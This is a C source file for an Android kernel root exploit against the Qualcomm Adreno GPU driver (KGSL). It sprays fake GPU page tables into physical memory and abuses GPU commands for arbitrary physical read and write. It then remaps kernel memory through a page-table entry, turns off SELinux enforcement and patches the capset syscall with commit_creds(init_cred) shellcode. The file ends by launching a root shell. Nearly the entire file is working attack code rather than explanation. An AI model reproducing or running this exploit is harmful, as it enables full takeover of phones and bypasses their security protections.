#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/capability.h>

#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

/* send pad IBs and a payload IB at a specific index to the GPU. the index is chosen to win
 * the race condition with the targeted context switch */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            /* the shift here is helpful for debugging failed alignment */
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

// TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
// increased this from 1G to 2G for Pixel 3 XL
// spray 16mb per mapping: 16MB*256=4GB
#define NPBUFS 256

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* "outer attributes are exported from the processor to the external memory bus
 * and are therefore potentially used by cache hardware external to the core or
 * cluster" */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
        // zhuowei: always have a self mapping
        level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                ENTRY_NG);
    }

    return 0;
}

// From Mesa/Freedreno/Turnip

static inline void
tu_sync_cacheline_to_gpu(void const *p __attribute__((unused)))
{
   /* Clean data cache. */
   __asm volatile("dc cvac, %0" : : "r" (p) : "memory");
}

static inline void
tu_sync_cacheline_from_gpu(void const *p __attribute__((unused)))
{
   /* Clean and Invalidate data cache, there is no separate Invalidate. */
   __asm volatile("dc civac, %0" : : "r" (p) : "memory");
}

uint32_t
tu_get_l1_dcache_size()
{
   /* Bionic does not implement _SC_LEVEL1_DCACHE_LINESIZE properly: */
   uint64_t ctr_el0;
   asm("mrs\t%x0, ctr_el0" : "=r"(ctr_el0));
   return 4 << ((ctr_el0 >> 16) & 0xf);
}

static uint64_t g_level1_dcache_size;

static void sync_cache_to_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_to_gpu(start);
    }
}

static void sync_cache_from_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_from_gpu(start);
    }
}

// #define DUMP_PAGEMAP
#ifdef DUMP_PAGEMAP
// https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
// https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/mm/pagemap.rst
uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
    uint64_t pagemap_data = 0;
    if (pread(pagemap_fd, &pagemap_data, sizeof(pagemap_data), (virt / 4096ull) * sizeof(uint64_t)) != sizeof(pagemap_data)) {
        return 0;
    }
    uint64_t mask = (1ull << 55) - 1; // bits 0-54
    return (pagemap_data & mask) * 4096;
}
#endif

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_CONTEXT_SWITCH_YIELD 0x6b

struct cheese_gpu_rw {
    int fd;
    uint32_t ctx_id;

    uint32_t* payload_buf;
    uint64_t payload_gpuaddr;
    uint32_t* output_buf;
    uint64_t output_gpuaddr;

    void* target_physical_page;

    uint64_t phyaddr;

    void* garbage;
};

const uint64_t kFakeGpuAddr = 0x40403000;
const uint64_t kGarbageSize = 16 * 1024 * 1024;

static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
    if (write) {
        *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
        for (int i = 0; i < count; i++) {
            *drawstate_cmds++ = values[i];
        }
    } else {
        // only support one 32-bit read for now...
        *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *drawstate_cmds++ = 0;
        drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
    }
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
    *drawstate_cmds++ = 0x41414141;

    uint32_t* payload_cmds = payload_buf;
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

#if 1
    fprintf(stderr, "running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
        fprintf(stderr, "%x ", payload_buf[i]);
    }
    fprintf(stderr, "\n");
    for (int i = 0; i < drawstate_cmds - drawstate_buf; i++) {
        fprintf(stderr, "%x ", drawstate_buf[i]);
    }
    fprintf(stderr, "\n");
#endif
    sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
    int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
    if (err) {
        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
        return 1;
    }
    return 0;
}

const uint64_t kKernelPageTableEntry = 0x1e0;

int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
#ifdef DUMP_PAGEMAP
    int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY): -1;
#endif

    // strings - xbl_config.img |grep Kernel
    // 0xA8000000, 0x10000000, "Kernel",            AddMem, SYS_MEM, SYS_MEM_CAP, Reserv, WRITE_BACK_XN
    // https://www.longterm.io/cve-2020-0423.html
    // https://github.com/LineageOS/android_kernel_google_msm-4.9/blob/cf7420326fc9659917177acb536a2a9a8bf65bfc/arch/arm64/kernel/vmlinux.lds.S#L236
    // https://duasynt.com/blog/android-pgd-page-tables
    // https://docs.kernel.org/arch/arm64/booting.html
    // kernel physical base + image_size - 0x1000 (tramp_pg_dir)
    // https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Kernel_Mitigations_Detail_v1.5.pdf?revision=a8859ae4-5256-47c2-8e35-a2f1160071bb&la=en
    // https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20Binder%20-%20The%20Bridge%20to%20Root%20-%20Hongli%20Han%20&%20Mingjian%20Zhou.pdf
    uint64_t kernel_physical_memory_region = 0xA8000000;
    //uint64_t swapper_pg_dir_phys = kernel_physical_memory_region + kernel_load_offset - 0x2000ull;
    //uint64_t target_write_physical_address = tramp_pg_dir_phys + (kKernelPageTableEntry * sizeof(uint64_t));
    uint64_t kernel_read_offset = 0x4; // read the first jump to see how large the kernel is in memory
    uint64_t target_read_physical_address = kernel_physical_memory_region + kernel_read_offset;
    uint64_t tramp_pte_target = 0x80000000;
    // that page has 0x00e8000000000751, which is:
    // https://developer.arm.com/documentation/101811/0104/Controlling-address-translation-Translation-table-format
    // block descriptor (0b01 << 0)
    // https://github.com/codingbelief/arm-architecture-reference-manual-for-armv8-a/blob/master/en/chapter_d4/d43_3_memory_attribute_fields_in_the_vmsav8-64_translation_table_formats_descriptors.md
    // AttrIndx = 0b100 << 2 -> MAIR_EL0 [4] <- on v4.9 this is MT_NORMAL
    // NS=0 <<5
    // AP=0b01 << 6 - full access, https://developer.arm.com/documentation/ddi0406/b/System-Level-Architecture/Virtual-Memory-System-Architecture--VMSA-/Memory-access-control/Access-permissions?lang=en
    // SH=0b11 << 8
    // AF=1 << 10
    // nG=0
    // DBM=1 << 51
    // cont=0 << 52
    // pxn=1 << 53 ??
    // uxn=1 << 54
    // nonSecure = 1 << 55
    // so we want MT_NORMAL on 5.10, which has index 0, so 0xe8000000000751
    uint64_t tramp_pte_value = tramp_pte_target | 0xe8000000000751;
    //uint64_t tramp_pte_value = 0x41414141;

    // from Adrenaline: spray physical memory
    /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
     *
     * it's chosen more or less at random based on results of performing a similar spray and then
     * checking commonly recurring entries in /proc/self/pagemap
     */
    uint64_t phyaddr = 0xfebeb000;

    /* spray 16mb per mapping */
    uint64_t pbuf_len = PAGE_SIZE * 4096;
    uint8_t *pbufs[NPBUFS];

    /* this loop is spraying a fake page table so that it hopefully lands at a fixed physical
     * address. one way that the exploit can fail is if this page has already been allocated,
     * in which case a reboot might be necessary */
    for (int i = 0; i < NPBUFS; i++) {
        uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            fprintf(stderr, "pbuf mmap failed (%d)\n", i);
            return 1;
        }

        /* our fake gpuaddress (0x40403000) is chosen to allow level1/2/3 to be at different
         * offsets within the same page (e.g. level 1 = 0x1, level2 = 0x3, level3 = 0x3.
         *
         * the target physical page (0x821D9000) corresponds to sys_call_table, which is at
         * a fixed physical address that you can calculate by taking the base of "Kernel Code"
         * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
        // zhuowei: actually, try to write to itself, please...
        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull);

        if (ret == -1) {
            fprintf(stderr, "setup_pagetables failed\n");
            return 1;
        }

        pbufs[i] = pbuf;
        //fprintf(stderr, "spray %p\n", pbuf);
#ifdef DUMP_PAGEMAP
        if (pagemap_fd != -1) {
            for (int off = 0; off < pbuf_len; off += 4096) {
                void* page_start = pbuf + off;
                fprintf(stderr, "addr: %p %p\n", page_start, (void*)GetPhys(pagemap_fd, (uint64_t)page_start));
            }
        }
#endif
        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
    }
    // end spray
    //fprintf(stderr, "end spray\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
        fprintf(stderr, "Can't do first read\n");
    }
    sleep(1);

    void* target_physical_page = NULL;
    int target_pbuf = -1;

    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        for (int off = 0; off < pbuf_len; off += 4096) {
            void* page_start = pbuf + off;
            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
            uint32_t* target = page_start + 0x100;
            if (target[0] == 0x41414141) {
                fprintf(stderr, "found it: virt addr = %p\n", page_start);
                target_physical_page = page_start;
                target_pbuf = i;
            }
        }
    }

    if (target_pbuf == -1) {
        fprintf(stderr, "can't find target\n");
        return 1;
    }

    uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
    fprintf(stderr, "read output: %x\n", read_output);

    if (read_output == 0) {
        fprintf(stderr, "can't find kernel entry at %lx\n", target_read_physical_address);
        return 1;
    }

    // https://developer.arm.com/documentation/ddi0596/2020-12/Index-by-Encoding/Branches--Exception-Generating-and-System-instructions
    uint32_t branch_off = read_output & ((1 << 26) - 1);
    uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
    fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);
    uint64_t swapper_pg_dir_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0x2000;
    uint64_t target_write_physical_address = swapper_pg_dir_physical_address + (kKernelPageTableEntry * sizeof(uint64_t));

    fprintf(stderr, "writing: %lx = %lx\n", target_write_physical_address, tramp_pte_value);

    if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
        return 1;
    }
    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/true, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value)) {
        fprintf(stderr, "Can't do second write\n");
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
    uint32_t second_write_sentinel = *(uint32_t*)(target_physical_page + 0x100);
    fprintf(stderr, "second write sentinel: %x\n", second_write_sentinel);

    // we don't need these anymore...
    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        if (i == target_pbuf) {
            munmap(pbufs[i], target_physical_page - pbuf);
            munmap(target_physical_page + 0x1000, (pbuf + pbuf_len) - (target_physical_page + 0x1000));
        } else {
            munmap(pbufs[i], pbuf_len);
        }
        pbufs[i] = NULL;
    }
    return 0;
}

#if 0
int cheese_physwrite(struct cheese_gpu_rw* cheese, uint64_t target_write_physical_address, uint32_t count, uint32_t* values) {
    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
        return 1;
    }
    // really stupid cache flush:
    memset(cheese->garbage, 0x1, kGarbageSize);
    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, cheese->phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + (target_write_physical_address & 0xfffull), count, values)) {
        return 1;
    }
    usleep(100000);
    memset(cheese->garbage, 0x1, kGarbageSize);
    volatile uint32_t* target_marker = cheese->target_physical_page + 0x100;
    for (int i = 0; i < 20; i++) {
        fprintf(stderr, "%x\n", target_marker[0]);
        if (target_marker[0] == 0x41414141) {
            return 0;
        }
        fprintf(stderr, "still waiting: %d\n", i);
        usleep(100000);
        memset(cheese->garbage, 0x1, kGarbageSize);
    }
    return 1;
}
#endif

int cheese_shutdown(struct cheese_gpu_rw* cheese) {
    int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(cheese->fd);
    return 0;
}

#define KALLSYMS_LOOKUP_INCLUDE
#include "kallsyms_lookup.c"

int main() {
    g_level1_dcache_size = tu_get_l1_dcache_size();
#if 1
    struct cheese_gpu_rw cheese = {};
    if (cheese_gpu_rw_setup(&cheese)) {
        fprintf(stderr, "can't get GPU r/w\n");
        return 1;
    }
#endif
    // now check ksma...
    fprintf(stderr, "about to ksma...\n");
    void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
    uint64_t ksma_physical_base = 0x80000000;
    //sync_cache_from_gpu(ksma_mapping + 0x08000000, ksma_mapping + 0x08000000 + 0x1000);
    uint32_t* mytarget = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x38 /* kernel header magic: ARMd */;
    fprintf(stderr, "%p=%x\n", mytarget, *mytarget);
    uint64_t* kernel_size_ptr = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x10 /* kernel header: size */;
    uint64_t kernel_size = *kernel_size_ptr;
    void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;

    void* kernel_copy_buf = malloc(kernel_size);
    memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
#if 0
    FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
    fwrite(kernel_copy_buf, 1, kernel_size, f);
    fclose(f);
#endif

    struct cheese_kallsyms_lookup kallsyms_lookup;
    if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
        return 1;
    }

    // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
    uint64_t kernel_virtual_base = kallsyms_lookup.kallsyms_relative_base;
    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
    bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
    fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
    *kernel_selinux_state_enforcing_ptr = false;
    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + 1);

    uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
    uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");

#define LO_DWORD(a) (a & 0xffffffff)
#define HI_DWORD(a) (a >> 32)

    // https://www.longterm.io/cve-2020-0423.html
    uint32_t shellcode[] = {
        // commit_creds(init_cred)
        0x58000040, // ldr x0, .+8
        0x14000003, // b   .+12
        LO_DWORD(init_cred_addr),
        HI_DWORD(init_cred_addr),
        0x58000041, // ldr x1, .+8
        0x14000003, // b   .+12
        LO_DWORD(commit_creds_addr),
        HI_DWORD(commit_creds_addr),
        0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
        0xD63F0020, // blr x1
        0xA8C17BFD, // ldp x29, x30, [sp], #0x10
    
        0x2A1F03E0, // mov w0, wzr
        0xD65F03C0, // ret
    };

    uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
    bool* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);

    /* Saving sys_capset current code */
    uint8_t sys_capset[sizeof(shellcode)];
    memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
    /* Patching sys_capset with our shellcode */
    memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));

    // stupidest cache flush...
    void* garbage = malloc(0x1000000);
    memset(garbage, 0x41, 0x1000000);
    free(garbage);

    /* Calling our patched version of sys_capset */
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wnonnull"
    int err = capset(NULL, NULL);
    #pragma clang diagnostic pop
    if (err) {
        fprintf(stderr, "capset returned %d\n", err);
        return 1;
    }
    /* Restoring sys_capset */
    memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));

    execl("/system/bin/sh", "sh", NULL);

    return 0;
}
